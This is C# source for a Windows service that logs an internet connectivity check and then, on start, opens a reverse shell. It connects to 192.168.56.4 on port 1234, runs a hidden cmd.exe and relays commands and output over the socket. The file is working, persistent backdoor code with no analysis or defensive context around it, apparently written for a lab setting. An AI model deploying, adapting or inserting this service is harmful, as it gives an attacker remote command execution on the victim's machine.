using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Net.Sockets;

namespace WindowsService_CheckConnect_and_CreateReverseShell
{
    public partial class Service1 : ServiceBase
    {
        static StreamWriter streamWriter;
        public static bool IsReachableUri(string uriInput)
        {
            // Variable to Return
            bool testStatus;
            // Create a request for the URL.
            WebRequest request = WebRequest.Create(uriInput);
            request.Timeout = 15000; // 15 Sec

            WebResponse response;
            try
            {
                response = request.GetResponse();
                testStatus = true; // Uri does exist                 
                response.Close();
            }
            catch (Exception)
            {
                testStatus = false; // Uri does not exist
            }
            // Result
            return testStatus;
        }

        public static void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs"; //get path
            if (!Directory.Exists(path))
            {
                //Check if path not exists, then create this directory
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\CheckConnection_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt"; //create file log with pattern
            if (!File.Exists(filepath))
            {
                //if this file not exists, then create this file.
                using (StreamWriter sw = File.CreateText(filepath))
                    sw.WriteLine(Message);
            }
            else
            {
                //because this file exists, i only write Message to this file
                using (StreamWriter sw = File.AppendText(filepath))
                    sw.WriteLine(Message);
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        private static void CreateReverseShell(String ip, int port)
        {
            using (TcpClient client = new TcpClient(ip, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            if (IsReachableUri("http://www.google.com"))
                WriteToFile(DateTime.Now + " HTTP Connected!");
            else
                WriteToFile(DateTime.Now + " HTTP Not connected");
            CreateReverseShell("192.168.56.4", 1234);
        }

        protected override void OnStop()
        {
        }
    }
}
